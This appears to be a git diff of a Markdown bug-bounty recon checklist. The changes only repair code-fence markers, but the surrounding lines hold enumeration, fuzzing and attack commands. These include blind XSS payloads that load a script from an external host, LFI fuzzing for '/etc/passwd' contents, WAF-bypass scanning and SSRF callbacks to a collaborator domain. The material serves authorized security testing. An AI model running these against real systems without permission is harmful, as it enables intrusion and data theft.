@@ -14,7 +14,8 @@ findomain -t example.com | tee subs_findomain.txt
 
 amass enum -passive -d example.com | awk -F']' '{print $NF}' | sort -u > subs_amass.txt
 amass enum -active  -d example.com | awk -F']' '{print $NF}' | sort -u >> subs_amass.txt
-```bash
+```
+
 - [ ] Public Sources (Manual/Custom)
 ```
 curl -s "https://crt.sh/?q=%25.example.com&output=json" | jq -r '.[].name_value' | sed 's/^\*\.//' | sort -u > subs_crtsh.txt
@@ -34,7 +35,8 @@ Make sure to configure all API keys.
 - [ ] GitHub Subdomain Scraping
 ```
 github-subdomains -d domain.com -t [github_token]
-```bash
+```
+
 - [ ] Shodan-Powered Subdomain Finder
 ```bash
 # Single domain  
@@ -56,7 +58,8 @@ Once you have the file, you can feed it directly into **Nuclei** for automated s
 
 ```bash
 cat ip.txt | nuclei -tags grafana -bs 50 -c 50 -es info
-```bash
+```
+
 - [ ]  Subdomain Permutation & DNS Resolution
 ```
 subfinder -d example.com | alterx | dnsx > subs_perm.txt
@@ -86,14 +89,16 @@ After enumerating subdomains, a great way to expand your attack surface is by id
 - [ ] ASN & IP Discovery
 ```bash
 asnmap -d example.com | dnsx -silent -resp-only > asn_ips.txt
-```bash
+```
+
 - [ ] Asset Discovery (Amass Intel)
 
 ```
 amass intel -org "nasa"
 amass intel -active -cidr 159.69.129.82/32
 amass intel -active -asn [asnno]
-```bash
+```
+
 - [ ]  Harvesting IP Addresses Linked to Domains
 ```bash
 curl -s "https://www.virustotal.com/vtapi/v2/domain/report?domain=<DOMAIN>&apikey=[api]" | jq -r '.. | .ip_address? // empty'
@@ -112,7 +117,8 @@ ffuf -u "https://FUZZ.target.com" -w wordlist.txt -mc 200,301,302
 - [ ] Directory & File Bruteforce
 ```
 ffuf -w directory-list.txt -u https://example.com/FUZZ -fc 400,401,403,404 -recursion -e .html,.php,.txt -t 100
-```bash
+```
+
 - [ ] Visual Recon (Aquatone)
 ```bash
 cat ip.txt | aquatone
@@ -147,7 +153,7 @@ katana -u subs_alive.txt -d 3 -o urls_crawled_katana.txt -js
 
 # Hakrawler recursive crawl
 cat subs_alive.txt | hakrawler -depth 3 -plain | sort -u >> urls_crawled_hakrawler.txt
-```bash
+```
 **Passive:**
 ```bash
 # GAU + Wayback + historical archives
@@ -156,17 +162,19 @@ cat subs_alive.txt | gau | waybackurls | urldedupe > urls_crawled_gau_wayback.tx
 # URLFinder (legacy/optional)
 urlfinder -d example.com | sort -u > urls_crawled_urlfinder.txt
 
-```bash
+```
  - [ ] Merge all into one master list
 ```
 cat urls_crawled_*.txt | sort -u > allurls.txt
-```bash
+```
+
 - [ ] Parameter Extraction
 Once you’ve collected a large list of URLs during recon, the next step is to extract only those URLs that contain parameters. ideal targets for testing vulnerabilities like XSS, SQLi, Open Redirect and for running **Nuclei DAST** templates.
 ```bash
 cat allurls.txt | grep '=' | urldedupe | tee param_extract_urldedupe.txt
 cat allurls.txt | grep -E '\?[^=]+=.+$'
-```bash
+```
+
 - [ ] Sensitive File Discovery
 From the collected URLs, we can identify potentially sensitive files (e.g., backups, config files, logs) that may lead to information disclosure vulnerabilities a common yet impactful bug category worth reporting.
 ```
@@ -256,7 +264,7 @@ subfinder -d http://example.com -all -silent | httpx-toolkit -td -sc -silent | g
 
 for possible SQL Endpoints:  
 echo http://site.com | gau | uro | grep -E ".php|.asp|.aspx|.jspx|.jsp" | grep -E '\?[^=]+=.+$'
-```bash
+```
 
 
 - [ ] XSS Detection
@@ -270,7 +278,8 @@ cat xss_output.txt | grep -oP '^URL: \K\S+' | sed 's/=.*/=/' | sort -u > final.t
 - [ ] XSS Testing Using FFUF Request Mode
 ```
 ffuf -request xss -request-proto https -w /root/wordlists/xss-payloads.txt -c -mr "<script>alert('XSS')</script>"
-```bash
+```
+
 - [ ] Blind XSS Testing
 ```bash
 cat urls.txt | grep -E "(login|signup|register|forgot|password|reset)" | httpx -silent | nuclei -t nuclei-templates/vulnerabilities/xss/ -severity critical,high
@@ -278,7 +287,7 @@ cat urls.txt | grep -E "(login|signup|register|forgot|password|reset)" | httpx -
 subfinder -d example.com | gau | bxss -payload '"><script src=https://xss.report/c/coffinxp></script>' -header "X-Forwarded-For"  
 subfinder -d example.com | gau | grep "&" | bxss -appendMode -payload '"><script src=https://xss.report/c/coffinxp></script>' -parameters  
 cat xss_params.txt | dalfox pipe --blind https://your-collaborator-url --waf-bypass --silence
-```bash
+```
 
 
 
@@ -304,7 +313,7 @@ echo "https://example.com/" | gau | gf lfi | uro | sed 's/=.*/=/' | qsreplace "F
 - [ ] LFI testing Using FFUF Request Mode
 ```
 ffuf -request lfi -request-proto https -w /root/wordlists/offensive\ payloads/LFI\ payload.txt -c -mr "root:"
-```bash
+```
 
 
 
@@ -325,7 +334,7 @@ cat example.coms.txt | httpx -silent | nuclei -t nuclei-templates/vulnerabilitie
 python3 corsy.py -i subdomains_alive.txt -t 10 --headers "User-Agent: GoogleBot\nCookie: SESSION=Hacked"  
 
 python3 CORScanner.py -u https://example.com -d -t 10
-```bash
+```
 
 
 - [ ] Subdomain Takeover Detection
@@ -382,7 +391,7 @@ http://017700000001
   
 # DNS rebinding or callback for blind SSRF  
 curl "https://target.com/page?url=http://yourdomain.burpcollaborator.net"
-```bash
+```
 
 
 
